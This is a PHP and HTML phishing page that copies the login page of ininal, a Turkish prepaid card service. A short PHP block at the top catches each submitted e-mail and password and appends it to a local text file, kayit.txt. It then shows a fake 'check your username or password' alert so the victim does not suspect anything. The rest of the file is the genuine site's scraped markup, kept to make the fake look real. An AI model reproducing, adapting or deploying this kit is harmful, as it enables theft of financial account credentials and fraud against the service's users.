<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>


<html lang="en"><head>
    <meta charset="utf-8">
    <meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <meta name="description" content="Ön Ödemeli Kart - internette indirimli, her yerde geçerli, yaş sınırı olmayan, kolay ulaşılabilen, hemen yüklenen alışveriş kartı.">
    <meta name="keywords" content="ininal, ininal Kart, ön ödemeli, oyun kartı, MasterCard, Provus, ParaMara, indirimli, alışveriş kartı, epin, mobil ödeme, e-ticaret">
    <meta name="robots" content="index, follow">
    <meta name="author" content="ininal">
    <meta name="google-site-verification" content="ovdVeySP_TthYAKypwbxovm8mXl8ocTlFcai7usF240">

    <meta name="apple-itunes-app" content="app-id=1029026167">
    <meta name="google-play-app" content="app-id=com.ininal.wallet">
    <link rel="stylesheet" href="https://www.ininal.com//static/css/jquery.smartbanner.css" type="text/css" media="screen">
    <link rel="apple-touch-icon" href="https://www.ininal.com//static/img/appicon.png">
    <link rel="manifest" href="https://www.ininal.com//static/manifest.json">
    <link rel="canonical" href="http://www.ininal.com/">
    <link rel="index" title="ininal kart" href="http://www.ininal.com/">
    <title>ininal - Her yerde geçen, kullanıma hazır, yaş sınırı olmayan, borçsuz ve ekstresiz alışveriş kartı</title>
    <link rel="icon" type="image/jpeg" href="https://www.ininal.com//static/img/favicon.jpg">
    <link rel="icon" type="image/vnd.microsoft.icon" href="https://www.ininal.com//static/img/favicon.ico">
    <!-- Bootstrap core CSS -->
    <link href="https://www.ininal.com//static/css/bootstrap.css" rel="stylesheet">
    <!-- Bootstrap theme -->
    <link href="https://www.ininal.com//static/css/bootstrap-theme.css" rel="stylesheet">
    <link href="https://www.ininal.com//static/css/custom.css" rel="stylesheet">
    <link href="https://www.ininal.com//static/css/bootstrap-editable.css" rel="stylesheet">
    <!--[if lt IE 8]>
    <link rel="stylesheet" href="/static/css/style-ie.css" type="text/css" />
    <![endif]-->
    <!-- Custom styles for this template -->
    <link href="https://www.ininal.com//static/css/style.css" rel="stylesheet">
    <link href="https://fonts.googleapis.com/css?family=Open+Sans:400italic,400,600,700&amp;subset=latin,latin-ext" rel="stylesheet" type="text/css">
    <!-- HTML5 shim and Respond.js for IE8 support of HTML5 elements and media queries -->
    <!--[if lt IE 9]>

    <!-- Google Tag Manager -->
    <script async="" src="//www.google-analytics.com/analytics.js"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/v1555968629716/recaptcha__tr.js"></script><script id="twitter-wjs" src="https://platform.twitter.com/widgets.js"></script><script async="" src="//c.supert.ag/p/00034d/supertag-code-v2.js"></script><script src="https://connect.facebook.net/signals/config/406113229776685?v=2.8.47&amp;r=stable" async=""></script><script async="" src="https://connect.facebook.net/en_US/fbevents.js"></script><script type="text/javascript" async="" src="https://www.gstatic.com/recaptcha/api2/v1555968629716/recaptcha__tr.js"></script><script async="" src="https://www.googletagmanager.com/gtm.js?id=GTM-W5B78PM"></script><script>(function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
        j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
        'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
    })(window,document,'script','dataLayer','GTM-W5B78PM');</script>
    <!-- End Google Tag Manager -->
    <script src="https://oss.maxcdn.com/html5shiv/3.7.2/html5shiv.min.js"></script>
    <script src="https://oss.maxcdn.com/respond/1.4.2/respond.min.js"></script>
    <script src="https://www.google.com/recaptcha/api.js"></script>

    <!--[endif]---->

    <!-- Facebook Pixel Code -->
    <script>
        !function(f,b,e,v,n,t,s){if(f.fbq)return;n=f.fbq=function(){n.callMethod?
                n.callMethod.apply(n,arguments):n.queue.push(arguments)};if(!f._fbq)f._fbq=n;
            n.push=n;n.loaded=!0;n.version='2.0';n.queue=[];t=b.createElement(e);t.async=!0;
            t.src=v;s=b.getElementsByTagName(e)[0];s.parentNode.insertBefore(t,s)}(window,
                document,'script','https://connect.facebook.net/en_US/fbevents.js');
        fbq('init', '406113229776685'); // Insert your pixel ID here.
        fbq('track', 'PageView');
    </script>
    <noscript><img height="1" width="1" style="display:none"
                   src="https://www.facebook.com/tr?id=406113229776685&ev=PageView&noscript=1"
            /></noscript>
    <!-- DO NOT MODIFY -->
    <!-- End Facebook Pixel Code -->
<script src="https://googleads.g.doubleclick.net/pagead/viewthroughconversion/954870156/?random=1558011033328&amp;cv=9&amp;fst=1558011033328&amp;num=1&amp;guid=ON&amp;resp=GooglemKTybQhCsO&amp;u_h=768&amp;u_w=1366&amp;u_ah=768&amp;u_aw=1366&amp;u_cd=24&amp;u_his=8&amp;u_tz=180&amp;u_java=false&amp;u_nplug=3&amp;u_nmime=4&amp;sendb=1&amp;frm=0&amp;url=https%3A%2F%2Fwww.ininal.com%2Flogin&amp;ref=https%3A%2F%2Fwww.google.com%2F&amp;tiba=ininal%20-%20Her%20yerde%20ge%C3%A7en%2C%20kullan%C4%B1ma%20haz%C4%B1r%2C%20ya%C5%9F%20s%C4%B1n%C4%B1r%C4%B1%20olmayan%2C%20bor%C3%A7suz%20ve%20ekstresiz%20al%C4%B1%C5%9Fveri%C5%9F%20kart%C4%B1&amp;rfmt=3&amp;fmt=4"></script><script src="https://ininal.botego.net//js/bot.js?" type="text/javascript"></script><link rel="stylesheet" type="text/css" href="https://ininal.botego.net//ajax.php?cmm=getCss"><script charset="utf-8" src="https://platform.twitter.com/js/button.dd024c345fc26f7c7a8d9938b67e5d3d.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/1/intl/tr_ALL/common.js"></script><script type="text/javascript" charset="UTF-8" src="https://maps.googleapis.com/maps-api-v3/api/js/37/1/intl/tr_ALL/util.js"></script></head>

<body role="document" style="">
<!-- Google Tag Manager (noscript) -->
<noscript><iframe src="https://www.googletagmanager.com/ns.html?id=GTM-W5B78PM"
                  height="0" width="0" style="display:none;visibility:hidden"></iframe></noscript>
<!-- End Google Tag Manager (noscript) -->





    

<div style="display:none">
<script async="" src="//c.supert.ag/p/00034d/supertag.js"></script>
<script async="" src="//img2-digitouch.mncdn.com/include/ininal.js"></script>
<script type="text/javascript">
    /* <![CDATA[ */
    var google_conversion_id = 954870156;
    var google_custom_params = window.google_tag_params;
    var google_remarketing_only = true;
    /* ]]> */
</script>
<script type="text/javascript" src="//www.googleadservices.com/pagead/conversion.js">
</script>
<noscript>
    <div style="display:inline;">
        <img height="1" width="1" style="border-style:none;" alt="" src="//googleads.g.doubleclick.net/pagead/viewthroughconversion/954870156/?guid=ON&amp;script=0"/>
    </div>
</noscript>
</div>
<input type="hidden" class="logined" value="">
<input type="hidden" class="updateGSMAmount" value="">
<input type="hidden" class="updateEmailAmount" value="">
<input type="hidden" class="responsive-tr" value="0">
<header role="banner">
    <nav class="navbar navbar-inverse" role="navigation">
        <div class="first-row">
            <div class="container">
                <div class="navbar-header col-sm-12">
                    <a class="image-s" href="/"> <img src="https://www.ininal.com/static/img/ininal_logo.png" alt="ininal" height="50"> </a>
                    <div class=" pull-right">
                        
                            
                            
                                <ul class="user-nav minTopMenu">
                                    <li><a class="like" href="/register"><i class="fa fa-plus-square "></i> <span class="">YENİ HESAP AÇ</span></a></li>
                                    <li><a class="like" href="/login"><i class="fa fa-unlock-alt "></i> <span class="">ONLINE İŞLEMLERE GİRİŞ YAP</span></a></li>
                                    <li><a class="like" target="_blank" href="http://shop.ininal.com/"><i class="fa fa-shopping-cart "></i> <span class="">SATIN AL</span></a></li>
                                </ul>
                            
                        
                    </div>
                </div>
            </div>
        </div>
        <div class="second-row">
            <div class="container">
                <div class="navbar-header navbar-nopad col-sm-12">
                    <button type="button" class="navbar-toggle collapsed" data-toggle="collapse" data-target="#navbar" aria-expanded="false" aria-controls="navbar">
                        <span class="sr-only">Toggle navigation</span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                        <span class="icon-bar"></span>
                    </button>
                    <div id="navbar" class="navbar-collapse collapse navbar-left">
                        <ul class="nav navbar-nav bigTopMenu">
                                    <li><a class="like" href="/register" style="display: none;"><i class="fa fa-plus-square "></i> <span class="">YENİ HESAP AÇ</span></a></li>
                                    <li><a class="like" href="/login" style="display: none;"><i class="fa fa-unlock-alt "></i> <span class="">ONLINE İŞLEMLERE GİRİŞ YAP</span></a></li>
                                    <li><a class="like" target="_blank" href="http://shop.ininal.com/" style="display: none;"><i class="fa fa-shopping-cart "></i> <span class="">SATIN AL</span></a></li>
                                
                            <li><a href="/">Anasayfa</a></li>
                            <li><a href="/nereden-alirim">Nereden Alırım</a></li>
                            <li><a href="/nereden-yuklerim">Nereden Yüklerim</a></li>
                            <li><a href="/kampanyalar">Kampanyalar</a></li>
                            <li><a href="/ucretler">Ücretler</a></li>
                            <li><a href="/sss">Sıkça Sorulan Sorular</a></li>
                            <li><a href="/iletisim">Bize Ulaşın</a></li>
                            <li><a target="_blank" href="https://blog.ininal.com">Blog</a></li>
                            <li><a target="_blank" href="https://developer.ininal.com">API</a></li>
                        </ul>
                    </div><!--/.nav-collapse -->
                </div>
            </div>
        </div>
    </nav>


</header>





 <main>
  <div class="grayed">
    <div class="container">
      <div class="pull-right top-message"><strong>ininal</strong>'da yeni misiniz?  <a href="/register">Hesap açın !</a></div>
      <h1>Üye Girişi </h1>
    </div>
  </div>
  <div class="container">
    <div class="user-records">





      <form method="post" class="validater col-xs-12" action="">
        <div class="alert  alert-danger " role="alert" style="display: none">
          <span class="glyphicon glyphicon glyphicon-ok-sign" aria-hidden="true"></span>
          <span class="sr-only"></span>
        </div>
        <div class="form-group">
            <label><span class="pull-right"><a href="/hesap/eposta-unuttum" class="forget-pass"><i class="fa fa-unlock-alt"></i>E-posta Adresimi Unuttum </a></span> E-posta<br>
              <input type="text" class="form-control email loginRequest_email" placeholder="" required="" name="login">
            <label class="error" style="display: none"></label>
          </label>
        </div>
        <div class="form-group">
          <label><span class="pull-right"><a href="/hesap/sifremi-unuttum" class="forget-pass"><i class="fa fa-unlock-alt"></i>Şifremi Unuttum </a></span> Şifre<br>
            <input type="password" class="form-control loginRequest_password" placeholder="" required="" name="password">
            <label class="error" style="display: none"></label>
          </label>
        </div>

        <div class="container">
          
        </div>
          <br>

        <button type="submit" tabindex="3" class="col-sm-7 loginButton pull-right"> GİRİŞ YAP <i class="fa fa-play-circle"></i></button>
      </form>





    </div>
  </div>
</main>
 <script src="https://www.google.com/recaptcha/api.js?hl=tr" async="" defer=""></script>
 <noscript>
     <div>
         <div style="width: 302px; height: 422px; position: relative;">
             <div style="width: 302px; height: 422px; position: absolute;">
                 <iframe src="https://www.google.com/recaptcha/api/fallback?k=6LdmTSsUAAAAAK7YZW673GutCK7mNiaF-KvFC2CY"
                         frameborder="0" scrolling="no"
                         style="width: 302px; height:422px; border-style: none;">
                 </iframe>
             </div>
         </div>
         <div style="width: 300px; height: 60px; border-style: none;
                   bottom: 12px; left: 25px; margin: 0px; padding: 0px; right: 25px;
                   background: #f9f9f9; border: 1px solid #c1c1c1; border-radius: 3px;">
      <textarea id="g-recaptcha-response" name="g-recaptcha-response"
                class="g-recaptcha-response"
                style="width: 250px; height: 40px; border: 1px solid #c1c1c1;
                          margin: 10px 25px; padding: 0px; resize: none;" >
      </textarea>
         </div>
     </div>
 </noscript>



<footer>
    <div class="first-row">
        <div class="container">
            <nav class="col-sm-12" role="navbar">
                <ul>
                    <li><a href="/sss">Sıkça Sorulan Sorular</a></li>
                    <li><a href="/hakkimizda">Hakkımızda</a></li>
                    <li><a href="/guvenlik">Güvenlik</a></li>
                    <li><a href="/kisisel-verilerin-korunmasi">Kişisel Verilerin Korunması</a></li>
                    <li><a href="/static/upload/pdf/user_agreement_new.pdf">Kullanıcı Sözleşmesi</a></li>
                    <li><a href="/en-yakin-noktalar">Satış ve Yükleme Noktaları</a></li>
                    <li><a href="/iletisim">Bize Ulaşın</a></li>
                    <li><a href="https://developer.ininal.com" target="_blank">API</a></li>
                </ul>
            </nav>
            <div class="col-sm-3">
                <div class="dropdown pull-right">
                    <button class="dropdown-toggle" type="button" id="dropdownMenu1" data-toggle="dropdown" aria-expanded="true"><i class="icn-tr"></i> Türkçe <span class="fa fa-angle-down"></span></button>
                    <ul class="dropdown-menu language" role="menu" aria-labelledby="dropdownMenu1">
                        <li role="presentation"><a role="menuitem" data="tr" tabindex="-1" href="?lang=tr"><i class="icn-tr"></i>Türkçe</a></li>
                        <li role="presentation"><a role="menuitem" data="en" tabindex="-1" href="?lang=en"><i class="icn-en"></i>English</a></li>
                    </ul>
                </div>
            </div>
        </div>
    </div>
    <div class="second-row">
        <div class="container">
            <div class="copyright">Tüm Hakları Saklıdır. © 2015 ininal</div>
            <img src="https://www.ininal.com//static/img/bddk1.png" style="padding-top: 9px; padding-bottom: 20px;" align="left">
            <img src="https://www.ininal.com//static/img/pcidss.png" style="padding-left:15px; padding-top: 9px; padding-bottom: 20px;" align="left">
            <img src="https://www.ininal.com//static/img/BKM_LOGO.png" style="padding-left:15px; padding-top: 9px; padding-bottom: 20px;" align="left">
            <img src="https://www.ininal.com//static/img/ODED.PNG" style="padding-left:15px; padding-top: 9px; padding-bottom: 20px;" align="left">
            <div id="app-download" class="col-sm-8 text-right">
                <a id="appIOS" href="https://itunes.apple.com/tr/app/ininal-cuzdan/id1029026167?mt=8" style="display: none; overflow: hidden; background: url(&quot;https://linkmaker.itunes.apple.com/images/badges/en-us/badge_appstore-lrg.svg&quot;) no-repeat; width: 165px; height: 40px;"></a>
                <a id="appAndroid" href="https://play.google.com/store/apps/details?id=com.ininal.wallet&amp;hl=en&amp;utm_source=global_co&amp;utm_medium=prtnr&amp;utm_content=Mar2515&amp;utm_campaign=PartBadge&amp;pcampaignid=MKT-Other-global-all-co-prtnr-py-PartBadge-Mar2515-1" style="display: none; overflow: hidden; background: url(&quot;https://www.ininal.com//static/img/google-play-badge.png&quot;) no-repeat; width: 165px; height: 64px;"></a>
            </div>
            <ul class="social col-sm-8 text-left">
                <li><a href="https://www.facebook.com/ininalkart" class="fb" target="_blank"><i class="fa fa-facebook"></i></a></li>
                <li><a href="https://twitter.com/ininal" class="tw" target="_blank"><i class="fa fa-twitter"></i></a></li>
            </ul>
            <ul class="social col-sm-8 text-left">
                <li><iframe id="twitter-widget-0" scrolling="no" frameborder="0" allowtransparency="true" class="twitter-follow-button twitter-follow-button-rendered" style="position: static; visibility: visible; width: 63px; height: 20px;" title="Twitter Follow Button" src="https://platform.twitter.com/widgets/follow_button.fb066ff7f5f4afee7716887031da2ea8.en.html#dnt=false&amp;id=twitter-widget-0&amp;lang=en&amp;screen_name=ininal&amp;show_count=false&amp;show_screen_name=false&amp;size=m&amp;time=1558011034387" data-screen-name="ininal"></iframe></li>
                <script>!function(d,s,id){var js,fjs=d.getElementsByTagName(s)[0],p=/^http:/.test(d.location)?'http':'https';if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src=p+'://platform.twitter.com/widgets.js';fjs.parentNode.insertBefore(js,fjs);}}(document, 'script', 'twitter-wjs');</script>
            </ul>
        </div>

    </div>

    <img src="https://www.ininal.com/static/img/hizli_cevap.png" alt="Hızlı Cevap" height="69" width="250" class="hizliCevap">
</footer>

<!-- Bootstrap core JavaScript
================================================== -->
<script type="text/javascript" src="/static/js/jquery-2.0.3.min.js"></script>
<script type="text/javascript" src="/static/js/bootstrap.js"></script>
<!-- IE10 viewport hack for Surface/desktop Windows 8 bug -->
<script type="text/javascript" src="/static/js/ie10-viewport-bug-workaround.js"></script>
<script type="text/javascript" src="/static/js/maskedinput.js"></script>
<script type="text/javascript" src="/static/js/validate.js"></script>
<script type="text/javascript" src="/static/js/confirm.js"></script>
<script type="text/javascript" src="/static/js/fileinput.js"></script>
<script type="text/javascript" src="/static/js/init.js"></script>
<script type="text/javascript" src="/static/js/jquery-ui-1.12.1.min.js"></script>
<script type="text/javascript" src="/static/js/jquery.form.js"></script>
<script type="text/javascript" src="/static/js/markerclusterer.js"></script>
<script type="text/javascript" src="https://maps.googleapis.com/maps/api/js?key=AIzaSyDiOzTYGzWXgiylqg3PHpSm5zG1ibCZkFY"></script>
<script type="text/javascript" src="/static/js/fullmap.js"></script>
<script type="text/javascript" src="/static/js/cookie.js"></script>
<script type="text/javascript" src="/static/js/Format.js"></script>
<script type="text/javascript" src="/static/js/jquery.smartbanner.js"></script>
<script type="text/javascript" src="/static/js/bootstrap-editable.js"></script>

    
    
        <script type="text/javascript" src="/static/js/main.js"></script>
    

<script>
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
                (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
            m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');

    ga('create', 'UA-36448409-1', 'auto');
    ga('send', 'pageview');

</script>

<script type="text/javascript">

    var value="/WEB-INF/jsp/authentication/login.jsp";
    var cardPath = value.substring(0,17);
    var changePasswordPath = value.localeCompare("/WEB-INF/jsp/account/changePassword.jsp");
    var n = cardPath.localeCompare("/WEB-INF/jsp/card");
    if(n != 0 )
    {
        if(changePasswordPath != 0)
        {
            function getParameterByName(name) {
                name = name.replace(/[\[]/, "\\[").replace(/[\]]/, "\\]");
                var regex = new RegExp("[\\?&]" + name + "=([^&#]*)"),
                        results = regex.exec(location.search);
                return results == null ? "" : decodeURIComponent(results[1].replace(/\+/g, " "));
            }

            var noCache = "";
            if (getParameterByName('noCache')) {
                noCache = "&noCache=" + new Date().getTime();
            }

            var headID = document.getElementsByTagName("head")[0];
            var newCss = document.createElement('link');
            newCss.rel = 'stylesheet';
            newCss.type = 'text/css';
            window._botURL = "https://ininal.botego.net/";
            newCss.href = window._botURL + '/ajax.php?cmm=getCss' + noCache;
            var newScript = document.createElement('script');
            newScript.src = window._botURL + '/js/bot.js?' + noCache;
            newScript.type = 'text/javascript';
            headID.appendChild(newScript);
            headID.appendChild(newCss);
        }

}

</script>



<iframe scrolling="no" frameborder="0" allowtransparency="true" src="https://platform.twitter.com/widgets/widget_iframe.fb066ff7f5f4afee7716887031da2ea8.html?origin=https%3A%2F%2Fwww.ininal.com&amp;settingsEndpoint=https%3A%2F%2Fsyndication.twitter.com%2Fsettings" title="Twitter settings iframe" style="display: none;"></iframe></body></html>